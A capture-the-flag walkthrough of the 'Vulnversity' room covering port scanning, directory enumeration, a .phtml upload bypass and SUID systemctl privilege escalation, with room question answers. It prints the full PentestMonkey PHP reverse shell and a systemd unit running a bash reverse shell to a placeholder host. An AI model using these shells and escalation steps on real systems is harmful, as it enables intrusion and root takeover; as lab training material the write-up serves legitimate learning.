# Room: Vulnversity 🎓
Difficulty: Easy

Topic: Reconnaissance, File Upload Bypass, and SUID Privilege Escalation

## 🛡️ Phase 1: Reconnaissance
I started by scanning the network using nmap -sV to identify services and versions.

Nmap Results:
``` bash
PORT     STATE SERVICE      VERSION
21/tcp   open  ftp          vsftpd 3.0.5
22/tcp   open  ssh          OpenSSH 8.2p1
139/tcp  open  netbios-ssn  Samba smbd 4
445/tcp  open  netbios-ssn  Samba smbd 4
3128/tcp open  http-proxy   Squid http proxy 4.10
3333/tcp open  http         Apache httpd 2.4.41
```
### Question 1: Scan the box; how many ports are open? 6

### Question 2: What version of the squid proxy is running on the machine? 4.10

### Question 3: How many ports will Nmap scan if the flag -p-400 was used? 400

### Question 4: What is the most likely operating system? Ubuntu

### Question 5: What port is the web server running on? 3333

### Question 6: What is the flag for enabling verbose mode? -v

## 🔍 Phase 2: Locating Directories
After finding a running web server, the next step is directory enumeration. I used Gobuster to find hidden paths.
``` bash
gobuster dir -u http://TARGET_IP:3333 -w /usr/share/wordlists/dirb/common.txt
```

### Question 7: What is the directory that has an upload form page? /internal/

## 💻 Phase 3: Compromising the Webserver
To gain access, I used the PentestMonkey PHP Reverse Shell. Since the server blocks the .php extension, I used a bypass technique by renaming the file to .phtml.

``` php
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net

set_time_limit (0);
$VERSION = "1.0";
$ip = 'YOUR_IP';
$port = LISTENING_PORT;
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; bash -i';
$daemon = 0;
$debug = 0;

if (function_exists('pcntl_fork')) {
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

chdir("/");

umask(0);

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?>
```
## Steps to execution:

Set up Listener: I opened a listener on my machine using nc -lvnp <PORT>.

Upload: I uploaded the payload as reverse_shell.phtml via the /internal/ page.

Trigger: I navigated to http://TARGET_IP:3333/internal/uploads/shell.phtml to execute the shell.

### Question 8: What common file type is blocked? .php

### Question 9: What extension is allowed? .phtml

### Question 10: Who manages the webserver? Bill

### Question 11: User flag: 8bd***

## ⚡ Phase 4: Privilege Escalation
To elevate my privileges, I searched for binaries with the SUID bit set using:
``` bash
find / -perm -4000 -type f 2>/dev/null
```

Explanation: This command searches the entire filesystem (/) for files that have the SUID (Set User ID) permission bit set. The option -perm -4000 filters files with the SUID bit, -type f ensures only regular files are returned, and 2>/dev/null suppresses permission error messages.

This is commonly used in privilege escalation to identify binaries that execute with the file owner's privileges (often root), which may be exploitable to gain elevated access.

### Question 12: Which SUID file stands out? /bin/systemctl

## Exploiting Systemctl

To abuse this I edit root.service on /tmp
``` bash
[Unit]
Description=roooooooooot

[Service]
Type=simple
User=root
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/YOUR_IP/9999 0>&1'

[Install]
WantedBy=multi-user.target
```
Command:
``` bash
/bin/systemctl link tmp/root.service
```
Open your listener using nc -lvnp 9999

Then run this command:
``` bash
 /bin/systemctl start root.service
```
And now we successfully gained root access and grab the root flag

### What is the root flag value? a58***


















